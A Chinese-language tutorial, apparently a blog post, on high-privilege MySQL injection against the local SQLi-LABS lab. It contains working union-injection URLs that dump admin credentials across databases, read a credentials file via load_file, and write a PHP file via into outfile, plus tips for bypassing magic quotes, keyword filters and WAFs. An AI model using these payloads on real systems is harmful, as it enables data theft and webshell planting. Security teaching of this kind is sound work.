# 原创
：  SQL高权限注入（附实例）-跨库注入-文件读写操作-魔术引号-防注入方法

# SQL高权限注入（附实例）-跨库注入-文件读写操作-魔术引号-防注入方法

## 一、导图

## 二、高权限注入

网站出现了注入点，可以分为两种情况，一种是普通用户的注入点，另一种是root用户的注入点。

## 三、高权限注入实例

此处以SQLi-LABS第二关为例来对“Pikachu漏洞联系平台”进行跨库注入
1. 经过检测可知此网站注入属于高权限注入，因为其用户是“root用户”。1. 通过网站的原码逐级寻找也可以发现此网页数据库权限是“root用户”权限。1. 因为要实现跨库注入，所以首先要知道本数据库以及目标数据库的数据库名称，才能继续向下通过表名、列名进而查询到数据。
比如下面的数据库A是“root用户”，就可以对相关的网站B、网站C进行跨库注入，但是想要实现跨库注入，首先就需要知道数据库B、数据库C的数据库名称。

```
网站A=数据库A=数据库用户A
            表名
                列名
                    数据

网站B=数据库B=数据库用户A
            表名
                列名
                    数据

网站C=数据库C=数据库用户A
            表名
                列名
                    数据
```
1. information_schema数据库与performance_schema 数据库均为 MySQL 自带的信息数据库。
```
在数据库中实际通过information_schema数据库列出数据库名

mysql&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| challenges         |
| mysql              |
| performance_schema |
| pikachu            |
| security           |
| sys                |
+--------------------+
7 rows in set (0.00 sec)

mysql&gt; use information_schema;
Database changed
mysql&gt; show tables;    #展示information_schema下所有的表名。
+---------------------------------------+
| Tables_in_information_schema          |
+---------------------------------------+
| CHARACTER_SETS                        |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMNS                               |    #所有数据库下的列名
| COLUMN_PRIVILEGES                     |
| ENGINES                               |
| EVENTS                                |
| FILES                                 |
| GLOBAL_STATUS                         |
| GLOBAL_VARIABLES                      |
| KEY_COLUMN_USAGE                      |
| OPTIMIZER_TRACE                       |
| PARAMETERS                            |
| PARTITIONS                            |
| PLUGINS                               |
| PROCESSLIST                           |
| PROFILING                             |
| REFERENTIAL_CONSTRAINTS               |
| ROUTINES                              |
| SCHEMATA                              |    #所有数据库名
| SCHEMA_PRIVILEGES                     |
| SESSION_STATUS                        |
| SESSION_VARIABLES                     |
| STATISTICS                            |
| TABLES                                |    #所有数据库下的表名
| TABLESPACES                           |
| TABLE_CONSTRAINTS                     |
| TABLE_PRIVILEGES                      |
| TRIGGERS                              |
| USER_PRIVILEGES                       |
| VIEWS                                 |
| INNODB_LOCKS                          |
| INNODB_TRX                            |
| INNODB_SYS_DATAFILES                  |
| INNODB_FT_CONFIG                      |
| INNODB_SYS_VIRTUAL                    |
| INNODB_CMP                            |
| INNODB_FT_BEING_DELETED               |
| INNODB_CMP_RESET                      |
| INNODB_CMP_PER_INDEX                  |
| INNODB_CMPMEM_RESET                   |
| INNODB_FT_DELETED                     |
| INNODB_BUFFER_PAGE_LRU                |
| INNODB_LOCK_WAITS                     |
| INNODB_TEMP_TABLE_INFO                |
| INNODB_SYS_INDEXES                    |
| INNODB_SYS_TABLES                     |
| INNODB_SYS_FIELDS                     |
| INNODB_CMP_PER_INDEX_RESET            |
| INNODB_BUFFER_PAGE                    |
| INNODB_FT_DEFAULT_STOPWORD            |
| INNODB_FT_INDEX_TABLE                 |
| INNODB_FT_INDEX_CACHE                 |
| INNODB_SYS_TABLESPACES                |
| INNODB_METRICS                        |
| INNODB_SYS_FOREIGN_COLS               |
| INNODB_CMPMEM                         |
| INNODB_BUFFER_POOL_STATS              |
| INNODB_SYS_COLUMNS                    |
| INNODB_SYS_FOREIGN                    |
| INNODB_SYS_TABLESTATS                 |
+---------------------------------------+
61 rows in set (0.00 sec)

mysql&gt; select * from schemata;    #展示所有数据库名
+--------------+--------------------+----------------------------+------------------------+----------+
| CATALOG_NAME | SCHEMA_NAME        | DEFAULT_CHARACTER_SET_NAME | DEFAULT_COLLATION_NAME | SQL_PATH |
+--------------+--------------------+----------------------------+------------------------+----------+
| def          | information_schema | utf8                       | utf8_general_ci        | NULL     |
| def          | challenges         | gbk                        | gbk_chinese_ci         | NULL     |
| def          | mysql              | latin1                     | latin1_swedish_ci      | NULL     |
| def          | performance_schema | utf8                       | utf8_general_ci        | NULL     |
| def          | pikachu            | utf8                       | utf8_unicode_ci        | NULL     |
| def          | security           | gbk                        | gbk_chinese_ci         | NULL     |
| def          | sys                | utf8                       | utf8_general_ci        | NULL     |
+--------------+--------------------+----------------------------+------------------------+----------+
7 rows in set (0.00 sec)
```
1. 获取所有的数据库名。
```
http://localhost/sqli-labs/Less-2/index.php?id=-1%20union%20select%201,group_concat(schema_name),3%20from%20information_schema.schemata
```
1. 通过上面的网页的源代码也可以看到上面显示的所有数据库名。1. 至此便产生了一个问题：该怎么知道哪个数据库名是要进行跨库注入的目标呢？
答：可以通过网站域名与数据库名字的关联来进行确认，如果此办法行不通便可以将所有数据库全部爬出来进行分析。

此次要进行跨库注入的目标是“Pikachu漏洞联系平台”，而上一步获取到的所有数据库里可以发现有一个数据库名称为“pikachu”，不难判断出此数据库即为跨库注入的目标的数据库。
1. 获取指定“pikachu”数据库名下的表名信息。1. 获取指定“pikachu”数据库下的表名“admin”下的列名信息。
```
正常查询方式：
http://localhost/sqli-labs/Less-2/index.php?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='admin'
```

注意：因为整个数据库中可能包含多个“admin”表，所以上述查询方式可能会查询到其它数据库内名称为“admin”的表，所以在进行此步查询时，最好在末尾添加限制条件：“table_schema=' 目标数据库名 '”。

```
添加限制条件后的查询方式：
http://localhost/sqli-labs/Less-2/index.php?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='admin' and table_schema='pikachu'
```
1. 获取指定“pikachu”数据库下的表名“admin”下的列名“name”、“password”下的数据信息。
```
http://localhost/sqli-labs/Less-2/index.php?id=-1 union select 1,name,password from pikachu.admin
```

在这里可能会产生一个疑问：为什么查询路径最后面写的是“pikachu.admin”？

答：此目的是对要查询的数据库进行指定，防止查询不到或者查询到错误信息。
1. 至此，便获取到了“Pikachu漏洞联系平台”的账号和密码。
## 四、文件读写操作
1. 需要用到MySQL数据库特有的两个内置函数。
```
文件读取：
load_file('文件路径')

eg：
mysql&gt; select load_file('C:\ceshi.txt');
+---------------------------+
| load_file('C:\ceshi.txt') |
+---------------------------+
| ceshi                     |
+---------------------------+
1 row in set (0.00 sec)


文件写入：
'文件内容' into outfile '文件路径'
'文件内容' into dumpfile '文件路径'

eg：
mysql&gt; select 'ceshi' into outfile 'C:\\ceshi.txt';
Query OK, 1 row affected (0.00 sec)

mysql&gt; select 'ceshi' into dumpfile 'C:\ceshi.txt';
Query OK, 1 row affected (0.00 sec)
```
1. 查询secure_file_priv 是否有限制。
```
mysql&gt; show global variables like '%secure_file_priv%';
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
```
|Value值|说明

说明
|NULL|不允许导入或导出

不允许导入或导出
|/tmp|只允许在 /tmp目录导入导出

只允许在 /tmp目录导入导出
|空|不限制目录

不限制目录
1. windows下：修改my.ini 在[mysqld]内加入secure_file_priv =1. linux下：修改my.cnf 在[mysqld]内加入secure_file_priv =
然后重启mysql，再次使用show global variables like '%secure_file_priv%';查询。
1. 注意：进行上述操作时，文件路径里的斜杠最好使用“/”或者“\\”，而不是使用默认的“\”，因为在很多编程语言中“\n”代表换行的意思，可能因此会发生错误。1. 可以使用此函数来进行敏感文件的读取，具体敏感文件路径可以参考下面的资料。
[常见的load_file()读取的敏感信息](https://blog.csdn.net/weixin_30292843/article/details/99381669)
1. 路径的常见获取方法：1. 知道文件路径后进行文件读取。
```
http://localhost/sqli-labs/Less-2/index.php?id=-1%20union%20select%201,load_file(%27C://phpstudy_pro//WWW//sqli-labs//sql-connections//db-creds.inc%27),3
```

查看源代码如下，可以发现文件信息已经出现。
1. 文件写入。
```
http://localhost/sqli-labs/Less-2/index.php?id=-1 union select 1,'x',3 into outfile %27C:\\phpstudy_pro\\WWW\\sqli-labs\\sql-connections\\x.php%27
```

查看原码可以发现出现了错误，原因是SQL语句的后面存在“LIMIT 0,1”干扰。

那么如何去掉后面SQL语句的干扰呢？

答：在我们输入的语句后面添加“--+”，将后面的SQL语句注释掉。

```
http://localhost/sqli-labs/Less-2/index.php?id=-1%20union%20select%201,%27x%27,3%20into%20outfile%20%27C:\\phpstudy_pro\\WWW\\sqli-labs\\x.php%27--+
```

可以看到文件成功被写入到了目标路径下。

## 五、魔术引号

在文件读写的过程中可能会出现魔术引号magic_quotes_gpc()的问题，即程序自动将进入PHP脚本的数据进行转意的过程。当打开时，所有的 '(单引号)，"(双引号)，\(反斜线)和 NULL 字符都会被自动加上一个\(反斜线)进行转义，这个的作用跟addslashes()的作用完全相同。

那么遇到这种问题该怎么半呢？

答：主要有编码、宽字节绕过两种方法。

将文件路径转化为Hex编码（不含引号及斜线）。

## 六、相关防注入
1. 自带防御：魔术引号（比较低级）1. 内置函数过滤（偏向于点对点）：is_int等
is_int：对输入的参数进行判断是否为整数，是整数就继续执行，不是整数就将其过滤掉（绕过不了）。

```
if(is_int($id)){
    $sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
    echo $sql;
    $result=mysql_query($sql);
}else{
    echo 'ni shi ge jj?';
}
```
1. 自定义关键字（偏向于全局）：select等
select：对输入的参数进行判断，如果包含要过滤的关键字select就将其转化为其它内容，或者直接将此数据包丢掉。

```
$id=$_REOUEST['id'];
$id=str_replace('select','fuck',$id);
```

但是在这里上述代码严谨程度并不高，所以可以将“select”改为大写“Select”来进行绕过。
1. waf相关防护：安全狗、宝塔等
大部分防护软件的防护机制会检索关键字，如果输入信息的关键字与其字典库内容相同，则会触发防护。

可以根据此原理来进行绕过。
